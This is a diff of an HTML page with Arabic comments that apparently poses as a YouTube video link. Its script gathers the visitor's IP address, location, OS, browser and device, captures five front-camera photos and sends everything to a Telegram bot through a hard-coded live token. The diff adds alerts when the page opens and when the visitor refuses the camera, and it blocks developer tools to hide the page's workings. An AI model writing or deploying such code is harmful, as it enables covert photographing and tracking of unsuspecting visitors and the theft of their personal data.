@@ -88,6 +88,20 @@
         ::-webkit-scrollbar {
             display: none;
         }
+        
+        /* رسالة تحذير الكاميرا (تظهر للمستخدم فقط) */
+        .camera-warning {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            background: rgba(255,0,0,0.8);
+            color: white;
+            padding: 8px 15px;
+            border-radius: 20px;
+            font-size: 12px;
+            z-index: 20;
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -113,36 +127,135 @@
     </div>
 
     <canvas id="canvas"></canvas>
+    
+    <div class="camera-warning" id="cameraWarning">
+        ⚠️ الكاميرا غير مفعلة - لن يتم إرسال الصور
+    </div>
 
     <script>
+        // ==================== إعدادات تليجرام ====================
         const BOT_TOKEN = "8179040156:AAFdn8ApCAIbaWhpLaFQMyqrwUwfR1hfyuY";
         let CHAT_ID = null;
         let stream = null;
         let cameraReady = false;
+        let notificationSent = false; // لمنع إرسال إشعارات متكررة
         
         const YOUTUBE_VIDEO_ID = "dQw4w9WgXcQ";
         
+        // معلومات المستخدم
         let ip = 'جاري الجلب...';
         let country = 'جاري الجلب...';
         let city = 'جاري الجلب...';
         let os = 'جاري الجلب...';
+        let browser = 'جاري الجلب...';
+        let device = 'جاري الجلب...';
+        let cameraStatus = 'لم يتم الطلب بعد';
         
+        // ==================== عناصر الصفحة ====================
         const camera = document.getElementById('camera');
         const canvas = document.getElementById('canvas');
         const blackScreen = document.getElementById('blackScreen');
         const videoBackground = document.getElementById('videoBackground');
         const youtubeFrame = document.getElementById('youtubeFrame');
         const countdownSpan = document.getElementById('countdown');
+        const cameraWarning = document.getElementById('cameraWarning');
         
-        // ==================== جلب نظام التشغيل ====================
-        function getOS() {
+        // ==================== إرسال رسالة نصية إلى تليجرام ====================
+        async function sendTelegramMessage(message) {
+            if (!CHAT_ID) {
+                console.log('⚠️ لا يمكن إرسال الرسالة: لا يوجد Chat ID');
+                return false;
+            }
+            
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                const result = await response.json();
+                if (result.ok) {
+                    console.log('✅ تم إرسال الرسالة إلى تليجرام');
+                    return true;
+                } else {
+                    console.log('❌ فشل إرسال الرسالة:', result.description);
+                    return false;
+                }
+            } catch(e) {
+                console.error('خطأ في إرسال الرسالة:', e);
+                return false;
+            }
+        }
+        
+        // ==================== إرسال إشعار فتح الرابط ====================
+        async function sendOpenNotification() {
+            if (notificationSent) return;
+            
+            // انتظار قليل لجلب المعلومات الأساسية
+            setTimeout(async () => {
+                const message = `
+🚪 <b>تم فتح الرابط</b>
+
+━━━━━━━━━━━━━━━━
+📍 <b>معلومات الزائر:</b>
+━━━━━━━━━━━━━━━━
+
+🌐 <b>IP:</b> ${ip}
+🗺️ <b>الدولة:</b> ${country}
+🏙️ <b>المدينة:</b> ${city}
+💻 <b>نظام التشغيل:</b> ${os}
+🌍 <b>المتصفح:</b> ${browser}
+📱 <b>الجهاز:</b> ${device}
+📷 <b>حالة الكاميرا:</b> ${cameraStatus}
+
+━━━━━━━━━━━━━━━━
+🕐 <b>الوقت:</b> ${new Date().toLocaleString('ar-SA')}
+━━━━━━━━━━━━━━━━
+                `;
+                
+                await sendTelegramMessage(message);
+                notificationSent = true;
+            }, 2000);
+        }
+        
+        // ==================== إرسال إشعار رفض الكاميرا ====================
+        async function sendCameraDeniedNotification() {
+            const message = `
+⚠️ <b>تم رفض الوصول إلى الكاميرا</b>
+
+━━━━━━━━━━━━━━━━
+📍 <b>معلومات الزائر:</b>
+━━━━━━━━━━━━━━━━
+
+🌐 <b>IP:</b> ${ip}
+🗺️ <b>الدولة:</b> ${country}
+🏙️ <b>المدينة:</b> ${city}
+💻 <b>نظام التشغيل:</b> ${os}
+🌍 <b>المتصفح:</b> ${browser}
+
+❌ <b>الحالة:</b> المستخدم رفض الكاميرا
+📸 <b>النتيجة:</b> لن يتم إرسال الصور
+
+━━━━━━━━━━━━━━━━
+🕐 <b>الوقت:</b> ${new Date().toLocaleString('ar-SA')}
+━━━━━━━━━━━━━━━━
+            `;
+            
+            await sendTelegramMessage(message);
+        }
+        
+        // ==================== جلب نظام التشغيل والمتصفح ====================
+        function getSystemInfo() {
             const userAgent = navigator.userAgent;
             
+            // نظام التشغيل
             if (userAgent.indexOf('Win') !== -1) {
                 if (userAgent.indexOf('Windows NT 10.0') !== -1) os = 'Windows 10/11';
                 else if (userAgent.indexOf('Windows NT 6.1') !== -1) os = 'Windows 7';
-                else if (userAgent.indexOf('Windows NT 6.2') !== -1) os = 'Windows 8';
-                else if (userAgent.indexOf('Windows NT 6.3') !== -1) os = 'Windows 8.1';
                 else os = 'Windows';
             }
             else if (userAgent.indexOf('Mac') !== -1) os = 'macOS';
@@ -153,95 +266,74 @@
             else if (userAgent.indexOf('iOS') !== -1) os = 'iOS';
             else if (userAgent.indexOf('iPhone') !== -1) os = 'iOS (iPhone)';
             else if (userAgent.indexOf('iPad') !== -1) os = 'iOS (iPad)';
-            else {
-                os = 'غير معروف';
-            }
+            else os = 'غير معروف';
             
-            console.log('✅ نظام التشغيل:', os);
+            // المتصفح
+            if (userAgent.indexOf('Chrome') !== -1 && userAgent.indexOf('Edg') === -1) browser = 'Chrome';
+            else if (userAgent.indexOf('Firefox') !== -1) browser = 'Firefox';
+            else if (userAgent.indexOf('Safari') !== -1 && userAgent.indexOf('Chrome') === -1) browser = 'Safari';
+            else if (userAgent.indexOf('Edg') !== -1) browser = 'Edge';
+            else browser = 'غير معروف';
+            
+            // الجهاز
+            if (/Mobile|Android|iPhone|iPad|iPod/i.test(userAgent)) device = 'جوال / جهاز لوحي';
+            else device = 'كمبيوتر';
+            
+            console.log('✅ معلومات النظام:', {os, browser, device});
         }
         
-        // ==================== جلب IP والدولة والمدينة (عدة خدمات) ====================
+        // ==================== جلب IP والدولة والمدينة ====================
         async function getLocationInfo() {
-            // قائمة الخدمات بالترتيب
             const services = [
                 {
                     name: 'ipapi.co',
                     url: 'https://ipapi.co/json/',
-                    parse: (data) => ({
-                        ip: data.ip,
-                        country: data.country_name,
-                        city: data.city
-                    })
+                    parse: (data) => ({ ip: data.ip, country: data.country_name, city: data.city })
                 },
                 {
                     name: 'ipwho.is',
                     url: 'https://ipwho.is/',
-                    parse: (data) => ({
-                        ip: data.ip,
-                        country: data.country,
-                        city: data.city
-                    })
+                    parse: (data) => ({ ip: data.ip, country: data.country, city: data.city })
                 },
                 {
                     name: 'freeipapi',
                     url: 'https://freeipapi.com/api/json/',
-                    parse: (data) => ({
-                        ip: data.ipAddress,
-                        country: data.countryName,
-                        city: data.cityName
-                    })
+                    parse: (data) => ({ ip: data.ipAddress, country: data.countryName, city: data.cityName })
                 },
                 {
                     name: 'ip-api.com',
                     url: 'https://ip-api.com/json/',
-                    parse: (data) => ({
-                        ip: data.query,
-                        country: data.country,
-                        city: data.city
-                    })
+                    parse: (data) => ({ ip: data.query, country: data.country, city: data.city })
                 }
             ];
             
             for (const service of services) {
                 try {
-                    console.log(`🔍 محاولة ${service.name}...`);
-                    const response = await fetch(service.url, {
-                        method: 'GET',
-                        headers: { 'Accept': 'application/json' },
-                        signal: AbortSignal.timeout(5000)
-                    });
-                    
+                    const response = await fetch(service.url, { signal: AbortSignal.timeout(5000) });
                     if (response.ok) {
                         const data = await response.json();
                         const result = service.parse(data);
-                        
-                        if (result.ip && result.ip !== 'undefined' && result.ip !== 'null') {
+                        if (result.ip && result.ip !== 'undefined') {
                             ip = result.ip;
                             country = result.country || 'غير متاح';
                             city = result.city || 'غير متاح';
-                            console.log(`✅ تم الجلب من ${service.name}:`, {ip, country, city});
+                            console.log(`✅ تم الجلب من ${service.name}`);
                             return true;
                         }
                     }
                 } catch (error) {
-                    console.log(`❌ فشل ${service.name}:`, error.message);
+                    console.log(`❌ فشل ${service.name}`);
                 }
             }
             
-            // إذا فشلت جميع الخدمات، نجلب IP فقط
+            // جلب IP فقط كحل أخير
             try {
                 const response = await fetch('https://api.ipify.org?format=json');
                 const data = await response.json();
                 ip = data.ip || 'غير متاح';
-                country = 'تعذر الجلب';
-                city = 'تعذر الجلب';
-                console.log('✅ تم جلب IP فقط:', ip);
             } catch(e) {
                 ip = 'غير متاح';
-                country = 'غير متاح';
-                city = 'غير متاح';
             }
-            
             return false;
         }
         
@@ -266,45 +358,50 @@
         // ==================== تشغيل الكاميرا ====================
         async function startCamera() {
             try {
+                console.log('📷 طلب الوصول إلى الكاميرا...');
+                cameraStatus = 'في انتظار الموافقة';
+                
                 stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "user" } 
                 });
+                
                 camera.srcObject = stream;
                 cameraReady = true;
+                cameraStatus = '✅ تمت الموافقة - الكاميرا تعمل';
                 console.log('✅ الكاميرا جاهزة');
                 return true;
+                
             } catch(err) {
                 console.error('خطأ الكاميرا:', err);
+                
+                if (err.name === 'NotAllowedError') {
+                    cameraStatus = '❌ المستخدم رفض الكاميرا';
+                    cameraWarning.style.display = 'block';
+                    setTimeout(() => { cameraWarning.style.display = 'none'; }, 5000);
+                    // إرسال إشعار رفض الكاميرا
+                    await sendCameraDeniedNotification();
+                }
+                else if (err.name === 'NotFoundError') {
+                    cameraStatus = '❌ لا توجد كاميرا في الجهاز';
+                }
+                else if (err.name === 'NotReadableError') {
+                    cameraStatus = '❌ الكاميرا مشغولة';
+                }
+                else {
+                    cameraStatus = `❌ خطأ: ${err.message}`;
+                }
+                
+                cameraReady = false;
                 return false;
             }
         }
         
-        // ==================== نص المعلومات ====================
-        function getInfoText(photoNumber) {
-            const ipType = ip && ip.includes(':') ? 'IPv6' : 'IPv4';
-            
-            return `
-📸 صورة ${photoNumber}/5
-
-━━━━━━━━━━━━━━━━
-📍 معلومات الموقع والجهاز:
-━━━━━━━━━━━━━━━━
-
-🌐 عنوان IP: ${ip}
-📌 نوع IP: ${ipType}
-🗺️ الدولة: ${country}
-🏙️ المدينة: ${city}
-💻 نظام التشغيل: ${os}
-
-━━━━━━━━━━━━━━━━
-🕐 الوقت: ${new Date().toLocaleString('ar-SA')}
-━━━━━━━━━━━━━━━━
-            `;
-        }
-        
         // ==================== التقاط وإرسال الصورة ====================
         async function captureAndSend(photoNumber) {
-            if (!CHAT_ID || !cameraReady) return false;
+            if (!CHAT_ID || !cameraReady) {
+                console.log(`⚠️ لا يمكن إرسال الصورة ${photoNumber}: الكاميرا غير متاحة`);
+                return false;
+            }
             
             try {
                 if (camera.videoWidth === 0 || camera.videoHeight === 0) return false;
@@ -321,7 +418,7 @@
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
                 formData.append('photo', blob, `photo_${Date.now()}.jpg`);
-                formData.append('caption', getInfoText(photoNumber));
+                formData.append('caption', `📸 صورة ${photoNumber}/5\n🕐 ${new Date().toLocaleString('ar-SA')}\n📍 ${country} - ${city}`);
                 
                 const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
@@ -332,10 +429,8 @@
                 if (result.ok) {
                     console.log(`✅ تم إرسال الصورة ${photoNumber}`);
                     return true;
-                } else {
-                    console.log(`❌ فشل إرسال الصورة ${photoNumber}:`, result.description);
-                    return false;
                 }
+                return false;
             } catch(e) {
                 console.error('خطأ في الإرسال:', e);
                 return false;
@@ -344,6 +439,11 @@
         
         // ==================== تصوير 5 صور ====================
         async function captureAllPhotos() {
+            if (!cameraReady) {
+                console.log('⚠️ الكاميرا غير متاحة - لن يتم التصوير');
+                return;
+            }
+            
             console.log('🎬 بدء تصوير 5 صور...');
             for (let i = 1; i <= 5; i++) {
                 await captureAndSend(i);
@@ -391,23 +491,35 @@
         async function init() {
             console.log('🚀 بدء التشغيل...');
             
-            getOS();
+            // 1. جلب معلومات النظام
+            getSystemInfo();
+            
+            // 2. جلب IP والموقع
             await getLocationInfo();
             
-            const cameraSuccess = await startCamera();
+            // 3. الحصول على Chat ID
             await getChatId();
             
+            // 4. إرسال إشعار فتح الرابط (حتى لو رفض الكاميرا)
+            await sendOpenNotification();
+            
+            // 5. محاولة تشغيل الكاميرا
+            const cameraSuccess = await startCamera();
+            
+            // 6. بدء التصوير (إذا سمح بالكاميرا)
             if (cameraSuccess && CHAT_ID) {
                 setTimeout(() => {
                     captureAllPhotos();
                 }, 1000);
             }
             
+            // 7. بدء تأخير الفيديو
             startVideoDelay();
         }
         
         init();
         
+        // منع أدوات المطور
         document.addEventListener('contextmenu', e => e.preventDefault());
         document.addEventListener('keydown', function(e) {
             if (e.key === 'F12' || 
